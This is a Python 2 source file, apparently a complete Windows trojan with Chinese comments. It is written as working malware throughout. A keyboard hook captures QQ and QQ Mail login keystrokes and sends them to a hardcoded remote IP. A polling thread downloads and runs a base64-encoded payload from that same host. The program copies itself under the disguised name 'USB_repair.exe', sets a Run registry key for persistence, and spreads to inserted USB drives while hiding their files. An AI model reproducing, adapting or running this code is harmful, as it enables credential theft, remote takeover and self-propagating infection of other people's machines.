# -*- coding: utf-8 -*-  
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import socket
import os
import time,threading
import win32api
import win32con
import urllib2
import base64

'''
author：
create time : 2018-11-23

'''
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

#进程状态时序逻辑
current_title = ""
current_data = ""
back_title = ""
old_title = ""

#定义一个磁盘状态列表，如果发现出现新的盘符路径，则判断为u盘
pan_old = {}
pan_new = {}
ids = ['c','d','e','f','g','h','i','j','k','l','m','n']

#定义自身复制目录信息
dirs = 'c:/ttt/'
fname = 'USB_repair.exe'
name = 'USB_repair.exe'  # 注册表要添加的项值名称
regpath = 'c:\\ttt\\USB_repair.exe'  # 注册表要添加的路径

#download and execute
def remotecommend():
    file_name = "dojob"
    file_extension = ".exe"
    file = ""
    downloadflag =0
    exeflag = 0

    commendurl = "http://139.199.220.37/commend.txt" # 通过命令文件控制木马的行为
    url = "http://139.199.220.37/job.bin" # 将要远程执行的bat、exe文件修改后缀为.bin,部署在远程主机上

    while True:
        time.sleep(10)
        try:
            response2 = urllib2.urlopen(commendurl)
        except Exception as e:
            continue 
        
        #response2 = urllib2.urlopen(commendurl)
        commend = response2.read()

        if commend.find("download") != -1 and downloadflag ==0:
            print "commend.find download ",commend.find("download")
            try:
                response = urllib2.urlopen(url)
            except Exception as e:
                continue 
            #response = urllib2.urlopen(url)
            file = base64.b64decode(response.read())
            print "-- + download file len =",len(file)
            with open(os.environ["TEMP"]+os.sep+file_name+file_extension,"wb") as output_file:
                output_file.write(file)
                downloadflag =1

        if commend.find("exe") != -1 and exeflag ==0:
            print "do job exe"
            print "commend.find exe ",commend.find("exe")
            if os.path.exists(os.environ["TEMP"]+os.sep+file_name+file_extension):
                os.startfile(os.environ["TEMP"]+os.sep+file_name+file_extension)
                exeflag =1

        #结束命令询问线程，命令中包含download and exe and stop，则会下载、运行、退出轮询线程
        if commend.find("stop") != -1 and commend.find("refresh") == -1:
            break
        #刷新
        if commend.find("refresh") != -1:
            downloadflag =0
            exeflag =0

#定义socket
def send(info):
    obj = socket.socket()
    obj.connect(("139.199.220.37",8668))
    obj.sendall(bytes(str(info)))

    ret_bytes = obj.recv(1024)
    ret_str = str(ret_bytes)
    print ret_str

#移动磁盘监测
def find():
    global pan_old
    global pan_new
    for x in ids:
        if os.path.exists(x+':/'):
            pan_old[x]=x
    while True:
        time.sleep(1)
        for j in ids:
            if os.path.exists(j+':/'):
                #存在该磁盘，则插入新列表
                pan_new[j]=j
            #如果不存在，看之前是否存在
            elif pan_old.get(j):
                #路径之前存在，则会记录在两个列表中；现在路径不存在，说明拔出。更新列表
                pan_new.pop(j)
                pan_old.pop(j)
                print " - disk removed：",j," !"
        #对比列表，找到U盘
        for i in ids:
            if pan_old.get(i,'-1') != pan_new.get(i,'-1'):
                if pan_new.get(i,-1):
                    print " + disk added：",i," !"
                    #拷贝文件
                    usbcopy(i)
                    #加入到磁盘列表
                    pan_old[i]=i

def usbcopy(i):
    filename = dirs+fname
    temp = bytearray()              
    usbfilename = i+':/'+fname
    print 'usbfilename',usbfilename
    if not os.path.exists(dirs):
        os.makedirs(dirs)
    #将当前目录下运行的程序读到缓存
    with open('./'+fname, 'rb') as f:
        temp = f.read()
    #u盘和电脑相互拷贝          
    if not os.path.exists(filename):
        with open(filename, 'wb') as f2:
            f2.write(temp)
        #电脑拷完添加开机自动运行
        autoRun()
    #u盘没有则拷贝自身到u盘，并先将u盘文件隐藏
    if not os.path.exists(usbfilename):
        #先睡眠60秒
        time.sleep(60)
        os.system('attrib +h +s +a +r '+i+':/* /d')
        with open(usbfilename, 'wb') as f2:
            f2.write(temp)

def ubsrun():
    filename = dirs+fname
    temp = bytearray()              

    if not os.path.exists(dirs):
        os.makedirs(dirs)

    #u盘和电脑相互拷贝          
    if not os.path.exists(filename):
        #将当前目录下运行的程序读到缓存
        with open('./'+fname, 'rb') as f:
            temp = f.read()
        with open(filename, 'wb') as f2:
            f2.write(temp)
        #电脑拷完添加开机自动运行
        autoRun()
        #将运行目录下的文件隐藏取消
        os.system('attrib -h -s -a -r ./* /d')

def autoRun():
    # 注册表项名
    KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    # 异常处理
    try:
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,  KeyName, 0,  win32con.KEY_ALL_ACCESS)
        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, regpath)
        win32api.RegCloseKey(key)
        print 'ojbk :) '
    except:
        print 'shi bai --!'
 
def get_current_process():
    global current_title
    global back_title
    global current_data
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()
 
    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
 
    # 将进程ID存入变量中
    process_id = "%d" % pid.value
 
    # 申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
 
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
 
    # 读取窗口标题
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
 
    # 打印
    #print
    #print "[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value)
    old_title = back_title
    back_title = current_title
    current_title = windows_title.value
    if old_title.find("QQ") == -1 and back_title.find("QQ") == -1 and current_title.find("QQ") == -1:
        current_data = ""
        print "clean-------"
    print "get current_title",current_title
    #发送当前窗口的点击数据
    if old_title=="QQ":
        if back_title == "QQEdit":
            if current_title.find("QQ") == -1: 
                print "QQ login  :",current_data
                send("QQ login  :"+current_data)
                #清空current_data
                current_data = ""
    				
    print "old_title = ",old_title,"back_title =",back_title,"current_title=",current_title   
    	
    if back_title.find("QQ") >1:
        #print "！--",back_title.find("QQ邮箱")
        if current_title.find("QQ") == -1: 
            send("QQ mail login :"+current_data)
            print "QQ mail login :",current_data
            #清空current_data
            current_data = ""    
    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


# 定义击键监听事件函数
def KeyStroke(event):
    global current_title
    global current_window
    global current_data
 
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用
        get_current_process()
        current_data += " ----- "

	#查询并监听qq窗口v
    if current_title.find("QQ") != -1:
        # 检测击键是否常规按键（非组合键等）
        if event.Ascii > 32 and event.Ascii <127:
            current_data += str(chr(event.Ascii))
            print "000current_data+=",current_data
            #print chr(event.Ascii),aaaaaaaa33333333888888
        
        else:
            current_data += event.Key
            print "222current_data+=",current_data
            #print "[%s]" % event.Key,
    # 循环监听下一个击键事件
    return True

#监测是否在其他目录运行，是则复制一份到c:/ttt，并添加启动项    
ubsrun()
#启动磁盘监测线程
t = threading.Thread(target=find, name='usbListen')
t.start()               
print "start to listen the usb :) "

#启动远程命令线程
t2 = threading.Thread(target=remotecommend, name='usbListen')
t2.start()   
print "start to listen the remotecommend :) "

# 创建并注册hook管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
 
# 注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()

